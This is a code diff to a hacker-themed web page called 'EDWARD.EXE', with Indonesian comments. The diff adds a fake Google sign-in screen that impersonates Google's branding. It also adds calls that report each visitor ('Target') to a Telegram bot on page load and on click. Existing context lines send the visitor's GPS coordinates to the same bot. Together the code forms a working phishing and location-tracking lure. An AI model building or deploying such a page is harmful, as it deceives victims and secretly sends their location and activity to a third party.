@@ -8,7 +8,18 @@
     <style>
         body { margin: 0; padding: 0; background: black; overflow: hidden; font-family: 'Courier New', Courier, monospace; }
         canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
-        #main-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #00ff00; text-align: center; background: rgba(0, 0, 0, 0.9); padding: 25px; border: 3px solid #00ff00; border-radius: 15px; width: 85%; max-width: 400px; z-index: 10; }
+        
+        /* Tampilan Login Google Palsu */
+        #login-google { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 5000; display: flex; justify-content: center; align-items: center; }
+        .google-box { text-align: center; font-family: 'Roboto', arial, sans-serif; color: #202124; width: 85%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; }
+        .google-box img { width: 75px; margin-bottom: 10px; }
+        .google-box h2 { font-size: 24px; margin-bottom: 10px; font-weight: 400; }
+        .google-box p { margin-bottom: 30px; color: #3c4043; }
+        .btn-google { display: flex; align-items: center; justify-content: center; background: #fff; border: 1px solid #dadce0; padding: 10px; border-radius: 4px; cursor: pointer; font-weight: 500; transition: background 0.2s; width: 100%; }
+        .btn-google:hover { background: #f7f8f8; }
+        .btn-google img { width: 20px; margin-right: 10px; margin-bottom: 0; }
+
+        #main-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #00ff00; text-align: center; background: rgba(0, 0, 0, 0.9); padding: 25px; border: 3px solid #00ff00; border-radius: 15px; width: 85%; max-width: 400px; z-index: 10; display: none; }
         .game-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
         button { background: transparent; color: #00ff00; border: 2px solid #00ff00; padding: 12px 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 0.8em; }
         .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; padding: 20px; box-sizing: border-box; color: #00ff00; overflow-y: auto; }
@@ -16,11 +27,23 @@
         .bar-container { width: 100%; border: 1px solid #00ff00; height: 15px; margin-top: 15px; }
         .bar-fill { width: 0%; height: 100%; background: #00ff00; }
         .exit-btn { width: 100%; height: 45px; background: #ff0000; color: white; border: none; margin-top: 15px; font-weight: bold; cursor: pointer; }
-        #terminal-box { text-align: left; font-size: 12px; height: 200px; overflow-y: hidden; }
     </style>
 </head>
-<body onload="sendTele('⚠️ INFO: Target baru saja membuka Website!')">
+<body onload="sendTele('⚠️ INFO: Seseorang baru saja membuka link (Halaman Google)')">
     <canvas id="matrix"></canvas>
+
+    <div id="login-google">
+        <div class="google-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
+            <h2>Login</h2>
+            <p>Gunakan Akun Google Anda untuk melanjutkan ke <b>Edward System</b></p>
+            <div class="btn-google" onclick="fakeLogin()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="G">
+                Lanjutkan dengan Google
+            </div>
+            <p style="margin-top: 40px; font-size: 12px; color: #70757a;">Untuk melanjutkan, Google akan membagikan nama, alamat email, dan foto profil Anda kepada Edward System.</p>
+        </div>
+    </div>
 
     <div id="main-content">
         <h2>> EDWARD.EXE</h2>
@@ -38,7 +61,7 @@
 
     <div id="terminal-overlay" class="overlay">
         <h3>[ TERMINAL EXPLOIT ]</h3>
-        <div id="terminal-box"></div>
+        <div id="terminal-box" style="text-align: left; font-size: 12px;"></div>
         <button class="exit-btn" onclick="closeOverlay('terminal-overlay')">CLOSE</button>
     </div>
 
@@ -79,13 +102,19 @@
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}`);
         }
 
+        function fakeLogin() {
+            sendTele("👤 TARGET KLIK: Lanjutkan dengan Google");
+            document.getElementById("login-google").style.display = "none";
+            document.getElementById("main-content").style.display = "block";
+        }
+
         function closeOverlay(id) { document.getElementById(id).style.display = "none"; }
 
         function openTerminal() {
             document.getElementById("terminal-overlay").style.display = "block";
             const box = document.getElementById("terminal-box");
             box.innerHTML = "";
-            const lines = ["> Connecting to proxy...", "> Bypass firewall...", "> Accessing root database...", "> Injecting payload...", "> SUCCESS: Handshake established."];
+            const lines = ["> Connecting...", "> Bypass Security...", "> SUCCESS."];
             let i = 0;
             const t = setInterval(() => {
                 box.innerHTML += lines[i] + "<br>";
@@ -97,12 +126,9 @@
             document.getElementById("scan-overlay").style.display = "block";
             let w = 0;
             const bar = document.getElementById("scan-bar");
-            const status = document.getElementById("scan-status");
             const t = setInterval(() => {
                 w += 2; bar.style.width = w + "%";
-                if(w == 40) status.innerText = "> Mencari file sistem...";
-                if(w == 80) status.innerText = "> Menemukan data tersembunyi...";
-                if(w >= 100) { clearInterval(t); status.innerText = "> SCAN SELESAI: 0 Virus ditemukan."; }
+                if(w >= 100) clearInterval(t);
             }, 50);
         }
 
@@ -133,7 +159,7 @@
                             var map = L.map('map').setView([p.coords.latitude, p.coords.longitude], 15);
                             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                             L.marker([p.coords.latitude, p.coords.longitude]).addTo(map);
-                            sendTele(`📍 LOKASI USER\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                            sendTele(`📍 LOKASI USER\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nGoogle Maps: http://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                         }
                     }, 50);
                 }, () => { sendTele("❌ User menolak lokasi."); });
